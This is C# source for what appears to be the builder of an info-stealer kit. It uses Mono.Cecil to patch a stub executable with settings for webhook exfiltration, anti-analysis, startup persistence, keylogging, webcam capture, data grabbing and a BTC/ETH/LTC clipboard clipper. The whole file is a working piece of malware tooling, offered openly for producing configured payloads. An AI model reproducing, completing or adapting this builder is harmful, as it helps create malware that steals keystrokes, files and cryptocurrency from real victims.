using Mono.Cecil;
using Mono.Cecil.Cil;

namespace Builder.Modules.build;

internal sealed class Build
{
    private static readonly Random Random = new();

    public static Dictionary<string, string> ConfigValues = new()
    {
        {"Webhook", ""},
        {"Debug", ""},

        {"AntiAnalysis", ""},
        {"Startup", ""},
        {"StartDelay", ""},

        {"ClipperBTC", ""},
        {"ClipperETH", ""},
        {"ClipperLTC", ""},

        {"WebcamScreenshot", ""},
        {"Keylogger", ""},
        {"Clipper", ""},

        {"Grabber", ""},

        {"Mutex", RandomString(20)}
    };

    private static string RandomString(int length)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        return new string(Enumerable.Repeat(chars, length)
            .Select(s => s[Random.Next(s.Length)]).ToArray());
    }


    // Read stub
    private static AssemblyDefinition ReadStub()
    {
        return AssemblyDefinition.ReadAssembly("Stub\\stub.exe");
    }

    // Write stub
    private static void WriteStub(AssemblyDefinition definition, string filename)
    {
        definition.Write(filename);
    }

    // Replace values in config
    private static string ReplaceConfigParams(string value)
    {
        foreach (var config in ConfigValues)
            if (value.Equals($"--- {config.Key} ---"))
                return config.Value;

        return value;
    }

    // Iterate through all classes, rows and replace values.
    public static AssemblyDefinition IterValues(AssemblyDefinition definition)
    {
        foreach (var definition2 in definition.Modules)
        foreach (var definition3 in definition2.Types)
            if (definition3.Name.Equals("Config"))
                foreach (var definition4 in definition3.Methods)
                    if (definition4.IsConstructor && definition4.HasBody)
                    {
                        IEnumerator<Instruction> enumerator = definition4.Body.Instructions.GetEnumerator();
                        while (enumerator.MoveNext())
                        {
                            var current = enumerator.Current;
                            if (current != null && (current.OpCode.Code == Code.Ldstr) & current.Operand is object)
                            {
                                var str = current.Operand.ToString();
                                if (str.StartsWith("---") && str.EndsWith("---"))
                                    current.Operand = ReplaceConfigParams(str);
                            }
                        }
                    }

        return definition;
    }

    // Read stub && compile
    public static string BuildStub()
    {
        var definition = ReadStub();
        definition = IterValues(definition);
        WriteStub(definition, "Stub\\build.exe");
        return "Stub\\build.exe";
    }
}